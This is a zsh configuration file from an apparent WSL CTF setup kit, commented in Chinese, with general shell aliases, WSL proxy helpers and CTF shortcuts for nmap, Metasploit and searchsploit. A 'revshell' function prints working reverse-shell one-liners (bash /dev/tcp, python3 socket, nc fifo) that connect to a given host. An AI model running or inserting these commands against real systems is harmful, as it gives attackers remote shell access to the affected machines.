# ===== wsl-ctf-kit 生成的 zsh 配置 =====
# 想加自己的东西，请追加到本文件末尾（重跑 setup.sh 会覆盖本段以外的内容）

export PATH="$HOME/.local/bin:$HOME/bin:$PATH"

# Windows 用户名（用于跳转 /mnt/c/Users/<名字>）
if [ -z "${WINUSER:-}" ]; then
  WINUSER=$(ls /mnt/c/Users 2>/dev/null \
    | grep -viE '^(Public|Default|Default User|All Users|desktop.ini)$' | head -n1)
  export WINUSER
fi

# ---------- 补全 / 高亮 ----------
autoload -Uz compinit && compinit -u 2>/dev/null
for _p in /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh \
          /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh; do
  [ -r "$_p" ] && source "$_p"
done
unset _p
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#6c6c6c'

setopt AUTO_CD INTERACTIVE_COMMENTS NO_BEEP EXTENDED_GLOB
bindkey -e
bindkey '^[[A' history-search-backward 2>/dev/null
bindkey '^[[B' history-search-forward  2>/dev/null

# ---------- 历史 ----------
HISTSIZE=100000; SAVEHIST=100000
HISTFILE="$HOME/.zsh_history"
setopt SHARE_HISTORY HIST_IGNORE_ALL_DUPS HIST_IGNORE_SPACE INC_APPEND_HISTORY

# ---------- fzf / zoxide ----------
# 注意：不要写 `source <(fzf --zsh) 2>/dev/null`——重定向只作用于 source，
# fzf 自己的 "unknown option: --zsh" 照样会打印出来（旧版 fzf 不支持该参数）。
if command -v fzf >/dev/null 2>&1; then
  export FZF_DEFAULT_OPTS='--height 45% --layout=reverse --border'
  if _fzf_init="$(fzf --zsh 2>/dev/null)"; then
    eval "$_fzf_init"
  elif [ -r /usr/share/doc/fzf/examples/key-bindings.zsh ]; then
    source /usr/share/doc/fzf/examples/key-bindings.zsh
  fi
  unset _fzf_init
fi
command -v zoxide >/dev/null 2>&1 && eval "$(zoxide init zsh)"

# ---------- 基础别名 ----------
alias ll='ls -alFh --color=auto --group-directories-first'
alias la='ls -Ah --color=auto --group-directories-first'
alias l='ls -CFh --color=auto'
alias ..='cd ..'
alias ...='cd ../..'
alias grep='grep --color=auto'
alias df='df -h'
alias du='du -h'
alias ports='ss -tulpen'
alias myip='curl -s https://ifconfig.me; echo'
alias winpath='wslpath -w "$PWD"'
winhome() { cd "/mnt/c/Users/${WINUSER}" || return 1; }
wdesk()   { cd "/mnt/c/Users/${WINUSER}/Desktop" || return 1; }

# ---------- CTF 别名 ----------
alias pwn='python3'
alias venv='python3 -m venv .venv && source .venv/bin/activate'
alias serve='python3 -m http.server'
alias listen='rlwrap nc -lvnp'
alias connect='nc -v'
alias hex='xxd -g1'
alias strings='strings -a -n 6'
alias r2='r2 -A'
alias vg='valgrind --leak-check=full --show-leak-kinds=all'
alias checksec='checksec --file'
alias aslr0='sudo sysctl -w kernel.randomize_va_space=0'
alias aslr2='sudo sysctl -w kernel.randomize_va_space=2'
alias core='cat /proc/sys/kernel/core_pattern'
alias nse='ls /usr/share/nmap/scripts | grep'
alias msf='sudo msfconsole'
alias seek='searchsploit'
alias nmap-up='nmap -sS -T4 -Pn --top-ports 1000'
alias nmap-full='nmap -sS -sV -sC -p- -T4 -Pn'

# ---------- CTF 小函数 ----------
f() { if [ $# -eq 0 ]; then file -k *; else file -k "$@"; fi }

extract() {
  local f="$1"
  [ -f "$f" ] || { echo "not a file: $f"; return 1; }
  case "$f" in
    *.tar.bz2|*.tbz2) tar xjf "$f" ;;
    *.tar.gz|*.tgz)   tar xzf "$f" ;;
    *.tar.xz|*.txz)   tar xJf "$f" ;;
    *.tar.zst)        tar --zstd -xf "$f" ;;
    *.tar)            tar xf  "$f" ;;
    *.bz2)            bunzip2 "$f" ;;
    *.gz)             gunzip  "$f" ;;
    *.xz)             unxz    "$f" ;;
    *.zst)            unzstd  "$f" ;;
    *.zip)            unzip   "$f" ;;
    *.7z)             7z x    "$f" ;;
    *.rar)            unrar x "$f" ;;
    *) echo "unknown archive type: $f"; return 1 ;;
  esac
}

# 题目目录骨架: ctfnew <名字>
ctfnew() {
  local n="${1:-chall}"
  mkdir -p "$n"/{files,src,out} && cd "$n" || return 1
  echo "已建 $n/{files,src,out}"; pwd
}

# 反向 shell 生成器: revshell <LHOST> [LPORT]
revshell() {
  local h="${1:?用法: revshell <LHOST> [LPORT]}" p="${2:-4444}"
  cat <<EOF
# bash
bash -i >& /dev/tcp/$h/$p 0>&1
# python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("$h",$p));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
# nc（无 -e 时用 fifo）
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $h $p > /tmp/f
EOF
}

# pwn 模板: newpwn [host] [port] [binary]
newpwn() {
  local host="${1:-127.0.0.1}" port="${2:-1337}" bin="${3:-./chall}"
  local out="${bin##*/}.py"
  cat > "$out" <<PY
#!/usr/bin/env python3
from pwn import *
context(os='linux', arch='amd64', log_level='info')
BIN = '${bin}'
HOST, PORT = '${host}', ${port}
elf = context.binary = ELF(BIN, checksec=False)
libc = None  # ELF('./libc.so.6')
def start():
    return remote(HOST, PORT) if args.REMOTE else process(BIN)
io = start()
# ---- exploit here ----
io.interactive()
PY
  echo "生成 $out"; ${EDITOR:-nano} "$out"
}

# ---------- Windows 代理（Clash 等需开「允许局域网连接」） ----------
win_host() { ip route show default 2>/dev/null | awk '{print $3}' | head -n1; }
proxy_on() {
  local port="${1:-7897}" gw; gw="$(win_host)"
  [ -n "$gw" ] || { echo "取不到宿主网关"; return 1; }
  export http_proxy="http://$gw:$port" https_proxy="http://$gw:$port" all_proxy="http://$gw:$port" \
         HTTP_PROXY="http://$gw:$port" HTTPS_PROXY="http://$gw:$port" ALL_PROXY="http://$gw:$port"
  echo "代理 → $gw:$port"
}
proxy_off() {
  unset http_proxy https_proxy all_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY
  echo "已关闭代理"
}
proxy_test() {
  local gw; gw="$(win_host)"
  echo "宿主网关: $gw"
  curl -s -o /dev/null -m 6 -w "  github.com  %{http_code}\n" https://github.com/ 2>/dev/null || true
  if timeout 2 bash -c "echo > /dev/tcp/$gw/7897" 2>/dev/null; then
    echo "  Windows 侧 7897 可达"
  else
    echo "  Windows 侧 7897 不可达（去 Clash 打开「允许局域网连接」）"
  fi
}
